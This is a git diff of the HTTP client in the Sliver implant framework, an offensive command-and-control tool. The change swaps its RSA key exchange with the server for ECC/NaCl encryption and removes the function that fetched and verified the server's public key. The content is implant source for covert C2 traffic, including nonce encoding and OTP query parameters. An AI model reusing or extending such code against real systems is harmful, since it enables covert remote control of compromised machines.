@@ -22,10 +22,7 @@ package httpclient
 
 import (
 	"bytes"
-	"crypto/rsa"
 	"crypto/tls"
-	"crypto/x509"
-	"encoding/pem"
 	"errors"
 	"fmt"
 	"io"
@@ -88,21 +85,15 @@ type SliverHTTPClient struct {
 
 // SessionInit - Initialize the session
 func (s *SliverHTTPClient) SessionInit() error {
-	publicKey := s.getPublicKey()
-	if publicKey == nil {
-		// {{if .Config.Debug}}
-		log.Printf("Invalid public key")
-		// {{end}}
-		return errors.New("{{if .Config.Debug}}Invalid public key{{end}}")
-	}
-	sKey := cryptography.RandomAESKey()
+	sKey := cryptography.RandomKey()
 	s.SessionCtx = cryptography.NewCipherContext(sKey)
 	httpSessionInit := &pb.HTTPSessionInit{Key: sKey[:]}
 	data, _ := proto.Marshal(httpSessionInit)
-	encryptedSessionInit, err := cryptography.RSAEncrypt(data, publicKey)
+
+	encryptedSessionInit, err := cryptography.ECCEncryptToServer(data)
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Printf("RSA encrypt failed %v", err)
+		log.Printf("Nacl encrypt failed %v", err)
 		// {{end}}
 		return err
 	}
@@ -155,59 +146,6 @@ func (s *SliverHTTPClient) OTPQueryArgument(uri *url.URL, value string) *url.URL
 	values.Add(string([]byte{key1, key2}), value)
 	uri.RawQuery = values.Encode()
 	return uri
-}
-
-func (s *SliverHTTPClient) getPublicKey() *rsa.PublicKey {
-	uri := s.keyExchangeURL()
-	nonce, encoder := encoders.RandomTxtEncoder()
-	s.NonceQueryArgument(uri, nonce)
-	otpCode := cryptography.GetOTPCode()
-	s.OTPQueryArgument(uri, otpCode)
-
-	// {{if .Config.Debug}}
-	log.Printf("[http] GET -> %s", uri)
-	// {{end}}
-
-	req := s.newHTTPRequest(http.MethodGet, uri, nil)
-	resp, err := s.Client.Do(req)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("[http] Failed to fetch server public key: %v", err)
-		// {{end}}
-		return nil
-	}
-	// {{if .Config.Debug}}
-	log.Printf("[http] <- %d Server key response", resp.StatusCode)
-	// {{end}}
-	respData, _ := ioutil.ReadAll(resp.Body)
-	data, err := encoder.Decode(respData)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("[http] Failed to decode response: %s", err)
-		// {{end}}
-		return nil
-	}
-	pubKeyBlock, _ := pem.Decode(data)
-	if pubKeyBlock == nil {
-		// {{if .Config.Debug}}
-		log.Printf("[http] Failed to parse certificate PEM")
-		// {{end}}
-		return nil
-	}
-
-	certErr := cryptography.RootOnlyVerifyCertificate([][]byte{pubKeyBlock.Bytes}, [][]*x509.Certificate{})
-	if certErr == nil {
-		// {{if .Config.Debug}}
-		log.Printf("[http] Got a valid public key")
-		// {{end}}
-		cert, _ := x509.ParseCertificate(pubKeyBlock.Bytes)
-		return cert.PublicKey.(*rsa.PublicKey)
-	}
-
-	// {{if .Config.Debug}}
-	log.Printf("[http] Invalid certificate %v", err)
-	// {{end}}
-	return nil
 }
 
 // We do our own POST here because the server doesn't have the
